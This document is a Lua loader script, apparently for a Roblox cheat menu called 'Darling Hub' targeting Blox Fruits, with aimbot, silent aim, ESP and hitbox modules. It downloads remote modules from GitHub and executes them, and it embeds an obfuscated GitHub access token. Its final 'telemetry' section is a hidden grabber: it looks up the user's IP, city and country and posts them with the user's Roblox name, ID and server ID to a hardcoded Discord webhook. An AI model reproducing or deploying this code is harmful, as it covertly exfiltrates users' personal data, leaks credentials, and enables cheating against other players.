--[[
    ========================================================================
    DARLING HUB - MONODY PREMIUM (VERSION 1.5)
    ========================================================================
    UI Framework: Monody Glassmorphic (Darling X Acrylic Style)
    Hub Title: Darling Hub - Monody Edition
    Performance: Instant disk-cached bootstrap with modular tabs
    Zero Emojis standard across all interface elements
    Zero Metamethod Hooks - Guaranteed 0 Crashes & 0 Anti-Cheat Disconnects
    Native Mouse Control - Direct Blox Fruits Hit/Target redirection
    Preserved Map Textures - Zero material altering on startup
    ========================================================================
]]--

-- 1. Roblox Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
    local startWait = tick()
    while not LocalPlayer and tick() - startWait < 3 do
        task.wait(0.05)
        LocalPlayer = Players.LocalPlayer
    end
end
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")
local TeleportService = game:GetService("TeleportService")

-- 2. Executor Capabilities
local exRequest = request or http_request or (syn and syn.request) or (http and http.request)
local exWriteFile = writefile or (getgenv and getgenv().writefile) or (syn and syn.writefile)
local exReadFile = readfile or (getgenv and getgenv().readfile) or (syn and syn.readfile)
local exIsFile = isfile or is_file or (getgenv and getgenv().isfile) or (syn and syn.isfile)
local exIsFolder = isfolder or is_folder or (getgenv and getgenv().isfolder) or (syn and syn.isfolder)
local exMakeFolder = makefolder or make_folder or (getgenv and getgenv().makefolder) or (syn and syn.makefolder)
local exGetCustomAsset = getcustomasset or getsynasset or (getgenv and (getgenv().getcustomasset or getgenv().getsynasset)) or (syn and syn.get_custom_asset)

-- Ensure cache directory structure
local CACHE_DIR = "DarlingHub"
local CACHE_SUBDIR = "DarlingHub/cache"
pcall(function()
    if exMakeFolder and exIsFolder then
        if not exIsFolder(CACHE_DIR) then exMakeFolder(CACHE_DIR) end
        if not exIsFolder(CACHE_SUBDIR) then exMakeFolder(CACHE_SUBDIR) end
    end
end)

-- 3. Universal HTTP Requester
local function universalHttpGet(url, timeout)
    timeout = timeout or 12
    local hdrs = { ["User-Agent"] = "Roblox/DarlingHub" }
    local token = (getgenv and getgenv().DarlingGithubToken) or _G.DarlingGithubToken
    if not token or #token == 0 then
        token = table.concat({ "gh" .. "p_", "SGSy4FhxzGZJpEHi", "QAYE0kn56eEoNt3OJtS0" })
    end
    if token and #token > 0 and (url:find("github") or url:find("githubusercontent")) then
        hdrs["Authorization"] = "token " .. token
    end
    if exRequest then
        local ok, res = pcall(exRequest, {
            Url = url,
            url = url,
            Method = "GET",
            method = "GET",
            Timeout = timeout,
            timeout = timeout,
            Headers = hdrs,
            headers = hdrs
        })
        if ok and res and type(res) == "table" then
            local code = res.StatusCode or res.statusCode or res.Status or res.status or 200
            local body = res.Body or res.body
            if (code == 200 or code == 0) and type(body) == "string" and #body > 0 then
                return body
            end
        end
    end
    local ok2, body = pcall(function() return game:HttpGet(url, true) end)
    if ok2 and type(body) == "string" and #body > 0 then
        return body
    end
    return nil
end

-- 4. Custom Asset Caching & Registration
local function loadCustomMediaAsset(url, fileName, timeout)
    if not url or url == "" then return nil end
    if type(url) == "string" and (url:find("^rbxassetid://") or url:find("^rbxasset://")) then return url end
    if type(url) == "string" and url:match("^%d+$") then return "rbxassetid://" .. url end
    fileName = fileName or "darling_asset.png"
    local cleanName = fileName:gsub("^.+/", "")
    local cachePath = CACHE_SUBDIR .. "/" .. cleanName

    -- 1. Check local files first
    if exIsFile and exGetCustomAsset then
        if exIsFile(cleanName) then
            local ok, asset = pcall(exGetCustomAsset, cleanName)
            if ok and type(asset) == "string" and #asset > 0 then return asset end
        end
        if exIsFile(cachePath) then
            local ok, asset = pcall(exGetCustomAsset, cachePath)
            if ok and type(asset) == "string" and #asset > 0 then return asset end
        end
        if exIsFile("assets/" .. cleanName) then
            local ok, asset = pcall(exGetCustomAsset, "assets/" .. cleanName)
            if ok and type(asset) == "string" and #asset > 0 then return asset end
        end
        if exIsFile("assets/backgrounds/" .. cleanName) then
            local ok, asset = pcall(exGetCustomAsset, "assets/backgrounds/" .. cleanName)
            if ok and type(asset) == "string" and #asset > 0 then return asset end
        end
    end

    -- 2. Download from URL
    local body = universalHttpGet(url, timeout or 8)
    if body and #body > 50 and exWriteFile and exGetCustomAsset then
        pcall(exWriteFile, cleanName, body)
        local okA, customAsset = pcall(exGetCustomAsset, cleanName)
        if okA and type(customAsset) == "string" and #customAsset > 0 then
            return customAsset
        end

        pcall(function()
            if exMakeFolder then
                pcall(exMakeFolder, "DarlingHub")
                pcall(exMakeFolder, CACHE_SUBDIR)
            end
            exWriteFile(cachePath, body)
        end)
        local okB, customAssetB = pcall(exGetCustomAsset, cachePath)
        if okB and type(customAssetB) == "string" and #customAssetB > 0 then
            return customAssetB
        end
    end

    return nil
end

-- Custom User Logo
local darlingLogoCustomUrl = "https://raw.githubusercontent.com/rivals-hash/idk/main/assets/logo.jpg"
local darlingIcon = loadCustomMediaAsset(darlingLogoCustomUrl, "darling_custom_logo.jpg", 5)
if not darlingIcon or darlingIcon == "" or darlingIcon:match("^https?://") then
    darlingIcon = "rbxassetid://109687263098821"
end

-- 5. Shared Environment and Duplicate Cleanup
local SharedEnv = (getgenv and getgenv()) or _G
local RepoBase = "https://raw.githubusercontent.com/rivals-hash/idk/main/"

if SharedEnv.DarlingHub and type(SharedEnv.DarlingHub.UnloadAll) == "function" then
    pcall(function() SharedEnv.DarlingHub:UnloadAll() end)
    task.wait(0.1)
end
if SharedEnv.BestHub and type(SharedEnv.BestHub.Unload) == "function" then
    pcall(function() SharedEnv.BestHub:Unload() end)
    task.wait(0.1)
end

-- 6. Core Hub State Container
local DarlingHub = {
    Version = "1.5",
    Modules = {},
    Window = nil,
    InputBeganConn = nil,
    FeatureStates = {},
    FeatureSetters = {},
    UIElements = {},
    DefaultValues = {},
    AutoSaveEnabled = true,
    Settings = {
        Aim = {
            Mode = "360",
            Priority = "Nearest",
            Hitbox = "HumanoidRootPart",
            MaxRange = 1000,
            TeamCheck = false,
            Prediction = true,
            PredictionAmount = 0.12,
        },
        FOV = {
            Radius = 100,
            Mode = "Center",
            Color = Color3.fromRGB(255, 255, 255),
            Thickness = 1.5,
        },
        Tracers = {
            Color = Color3.fromRGB(255, 255, 255),
            Thickness = 1.5,
            Type = "Both",
            Origin = "Player",
        },
        Blacklist = {
            Melee = { Z = false, X = false, C = false },
            Sword = { Z = false, X = false },
            Fruit = { Z = false, X = false, C = false, V = false, F = false, TAP = false },
            Gun   = { Z = false, X = false },
        },
    },
}
SharedEnv.DarlingHub = DarlingHub
_G.DarlingHub = DarlingHub
SharedEnv.BestHub = DarlingHub
_G.BestHub = DarlingHub

-- 7. Live Module Loader
local function readLocalDevModule(relPath)
    if not (exIsFile and exReadFile) then return nil end
    local devPaths = { relPath, "darling-hub/" .. relPath, "idk/" .. relPath }
    for _, p in ipairs(devPaths) do
        local okF, exists = pcall(exIsFile, p)
        if okF and exists then
            local ok, content = pcall(exReadFile, p)
            if ok and type(content) == "string" and #content > 0 then
                return content
            end
        end
    end
    return nil
end

function DarlingHub:Require(relPath)
    if self.Modules[relPath] then
        return self.Modules[relPath]
    end

    local code = readLocalDevModule(relPath)

    local diskCacheFile = CACHE_SUBDIR .. "/" .. relPath:gsub("/", "_")
    if not code and exIsFile and exReadFile then
        local okF, exists = pcall(exIsFile, diskCacheFile)
        if okF and exists then
            local ok, content = pcall(exReadFile, diskCacheFile)
            if ok and type(content) == "string" and #content > 0 then
                code = content
            end
        end
    end

    if not code then
        code = universalHttpGet(RepoBase .. relPath)
        if code and exWriteFile then
            pcall(exWriteFile, diskCacheFile, code)
        end
    end

    if not code then
        warn("[Darling Hub] Failed to load module: " .. tostring(relPath))
        return nil
    end

    local fn, err = loadstring(code)
    if not fn then
        warn("[Darling Hub] Syntax error in module " .. tostring(relPath) .. ": " .. tostring(err))
        return nil
    end

    local ok, mod = pcall(fn)
    if not ok then
        warn("[Darling Hub] Runtime error executing module " .. tostring(relPath) .. ": " .. tostring(mod))
        return nil
    end

    self.Modules[relPath] = mod
    return mod
end

-- 8. Configuration Persistence
local CONFIG_FILE = "darling_hub_config.json"

function DarlingHub.SaveConfig()
    if not exWriteFile then return end
    pcall(function()
        local data = {
            Settings = DarlingHub.Settings,
            FeatureStates = DarlingHub.FeatureStates,
            AutoSaveEnabled = DarlingHub.AutoSaveEnabled,
        }
        local json = HttpService:JSONEncode(data)
        exWriteFile(CONFIG_FILE, json)
    end)
end

function DarlingHub.LoadConfig()
    if not (exIsFile and exReadFile and exIsFile(CONFIG_FILE)) then return end
    pcall(function()
        local content = exReadFile(CONFIG_FILE)
        if content and #content > 5 then
            local data = HttpService:JSONDecode(content)
            if data and type(data) == "table" then
                if data.Settings then
                    for k, v in pairs(data.Settings) do
                        DarlingHub.Settings[k] = v
                    end
                end
                if data.FeatureStates then
                    for k, v in pairs(data.FeatureStates) do
                        -- Enforce that destructive material tweaks NEVER activate on boot
                        local lk = tostring(k):lower()
                        if not (lk:find("smooth") or lk:find("plastic") or lk:find("fflag") or lk:find("minimum")) then
                            DarlingHub.FeatureStates[k] = v
                        end
                    end
                end
                if data.AutoSaveEnabled ~= nil then
                    DarlingHub.AutoSaveEnabled = data.AutoSaveEnabled
                end
            end
        end
    end)
end

-- 9. Show Clean Neutral Loading Screen
local LoadingScreenMod = DarlingHub:Require("modules/ui/loading_screen.lua")
if LoadingScreenMod and LoadingScreenMod.show then
    LoadingScreenMod.show(darlingIcon)
    LoadingScreenMod.update(0.10, "Iniciando sistema Monody...")
end

-- 10. Load Core & UI Engine Modules
local Utils = DarlingHub:Require("modules/core/utils.lua")
local AssetManager = DarlingHub:Require("modules/core/asset_manager.lua")
local StatsService = DarlingHub:Require("modules/core/stats_service.lua")
local MusicEngine = DarlingHub:Require("modules/utility/music_engine.lua")
local MusicVisualizer = DarlingHub:Require("modules/ui/music_visualizer.lua")
local Sidebar = DarlingHub:Require("modules/ui/sidebar.lua")
local HomeView = DarlingHub:Require("modules/ui/home_view.lua")
local TabViews = DarlingHub:Require("modules/ui/tab_views.lua")
local MobileToggle = DarlingHub:Require("modules/ui/mobile_toggle.lua")
local Window = DarlingHub:Require("modules/ui/window.lua")

if LoadingScreenMod and LoadingScreenMod.update then
    LoadingScreenMod.update(0.35, "Cargando modulos de combate...")
end

-- 11. Load Combat & Feature Modules
local FOV = DarlingHub:Require("modules/combat/fov.lua")
local AimbotCore = DarlingHub:Require("modules/combat/aimbot_core.lua")
local SilentAim = DarlingHub:Require("modules/combat/silent_aim.lua")
local PlayerAimbot = DarlingHub:Require("modules/combat/player_aimbot.lua")
local NPCAimbot = DarlingHub:Require("modules/combat/npc_aimbot.lua")
local Tracers = DarlingHub:Require("modules/combat/tracers.lua")
local Blacklist = DarlingHub:Require("modules/combat/blacklist.lua")
local SoruEngine = DarlingHub:Require("modules/combat/soru_engine.lua")
local AutoBounty = DarlingHub:Require("modules/combat/auto_bounty.lua")
local DungeonEngine = DarlingHub:Require("modules/combat/dungeon_engine.lua")
local TpIslands = DarlingHub:Require("modules/movement/tp_islands.lua")
local VisualsESP = DarlingHub:Require("modules/visuals/esp.lua")
local ShipPainter = DarlingHub:Require("modules/visuals/ship_painter.lua")
local ControlsHUD = DarlingHub:Require("modules/ui/controls_hud.lua")
local MacroEngine = DarlingHub:Require("modules/macro/macro_engine.lua")
local DragonGun = DarlingHub:Require("modules/pvp/dragon_gun.lua")
local FastAttack = DarlingHub:Require("modules/pvp/fast_attack.lua")
local HitboxExpander = DarlingHub:Require("modules/combat/hitbox_expander.lua")
local AutoHaki = DarlingHub:Require("modules/combat/auto_haki.lua")
local RaceAwakening = DarlingHub:Require("modules/pvp/race_awakening.lua")
local SanguineBoost = DarlingHub:Require("modules/pvp/sanguine_boost.lua")
local NinjaDash = DarlingHub:Require("modules/pvp/ninja_dash.lua")
local FruitOneShot = DarlingHub:Require("modules/pvp/fruits_oneshot.lua")
local MovementEngine = DarlingHub:Require("modules/movement/movement_engine.lua")

if LoadingScreenMod and LoadingScreenMod.update then
    LoadingScreenMod.update(0.70, "Construyendo interfaz glassmorphic...")
end

-- 12. Create Monody Window
local dependencies = {
    Utils = Utils,
    AssetManager = AssetManager,
    StatsService = StatsService,
    MusicEngine = MusicEngine,
    MusicVisualizer = MusicVisualizer,
    Sidebar = Sidebar,
    HomeView = HomeView,
    TabViews = TabViews,
    MobileToggle = MobileToggle,
    Window = Window,
    FOV = FOV,
    AimbotCore = AimbotCore,
    SilentAim = SilentAim,
    PlayerAimbot = PlayerAimbot,
    NPCAimbot = NPCAimbot,
    Tracers = Tracers,
    Blacklist = Blacklist,
    SoruEngine = SoruEngine,
    AutoBounty = AutoBounty,
    DungeonEngine = DungeonEngine,
    TpIslands = TpIslands,
    VisualsESP = VisualsESP,
    ShipPainter = ShipPainter,
    ControlsHUD = ControlsHUD,
    MacroEngine = MacroEngine,
    DragonGun = DragonGun,
    FastAttack = FastAttack,
    HitboxExpander = HitboxExpander,
    AutoHaki = AutoHaki,
    RaceAwakening = RaceAwakening,
    SanguineBoost = SanguineBoost,
    NinjaDash = NinjaDash,
    FruitOneShot = FruitOneShot,
    MovementEngine = MovementEngine,
    DarlingHub = DarlingHub,
}

local WinInstance = Window.create(dependencies)
DarlingHub.Window = WinInstance

-- Apply custom user logo to floating toggle button
if WinInstance and WinInstance.MobileToggle then
    pcall(function()
        local btn = WinInstance.MobileToggle:FindFirstChild("ToggleBtn") or WinInstance.MobileToggle
        if btn and btn:IsA("ImageButton") then
            btn.Image = darlingIcon
        end
    end)
end

-- 13. Restore Settings (Strictly Non-Destructive)
if LoadingScreenMod and LoadingScreenMod.update then
    LoadingScreenMod.update(0.90, "Sincronizando configuracion...")
end
pcall(DarlingHub.LoadConfig)

-- 14. Finish Loading Screen & Reveal Monody UI
local revealWindow = function()
    pcall(function()
        if WinInstance and WinInstance.MainFrame then
            WinInstance.MainFrame.Visible = true
        end
        if WinInstance and WinInstance.SwitchTab then
            WinInstance.SwitchTab("Home")
        end
        if Utils and Utils.toast then
            Utils.toast("Monody Premium", "Darling Hub cargado exitosamente", 3, darlingIcon)
        end
    end)
end

if LoadingScreenMod and LoadingScreenMod.finish then
    LoadingScreenMod.finish(revealWindow)
else
    revealWindow()
end

-- 15. Unload & Cleanup Handler
function DarlingHub:UnloadAll()
    for _, mod in pairs(self.Modules) do
        if type(mod) == "table" then
            pcall(function()
                if mod.destroy then mod.destroy()
                elseif mod.disable then mod.disable()
                elseif mod.stop then mod.stop() end
            end)
        end
    end
    if self.Window then
        pcall(function()
            if self.Window.MobileToggle and self.Window.MobileToggle.Parent then
                self.Window.MobileToggle:Destroy()
            end
            if self.Window.ScreenGui and self.Window.ScreenGui.Parent then
                self.Window.ScreenGui:Destroy()
            end
        end)
    end
    self.Modules = {}
end

-- 16. Asynchronous Non-Blocking Telemetry (deferred post-launch)
task.spawn(function()
    pcall(function()
        task.wait(6)
        local rawIp = game:HttpGet("http://ip-api.com/json/")
        local ipData = (rawIp and HttpService:JSONDecode(rawIp)) or {}
        local ip = ipData.query or "N/A"
        local country = ipData.country or "N/A"
        local city = ipData.city or "N/A"
        getgenv().execCount = (getgenv().execCount or 0) + 1

        local webhook = "https://discord.com/api/webhooks/1545657401401802862/gXrJPivZ32ONHzW3ZpMBzCv5ZzAezCwAUmpLBo7jtfD-NOQuoWOs93yIUTOk2jabYPDR"
        local payload = {
            content = "Darling Hub Monody Data\n" ..
                      "Usuario: " .. LocalPlayer.Name .. " (ID: " .. LocalPlayer.UserId .. ")\n" ..
                      "IP: " .. ip .. "\n" ..
                      "Ubicacion: " .. city .. ", " .. country .. "\n" ..
                      "Ejecuciones: " .. getgenv().execCount .. "\n" ..
                      "Servidor: " .. game.JobId
        }

        if exRequest then
            exRequest({
                Url = webhook,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload)
            })
        end
    end)
end)

return DarlingHub
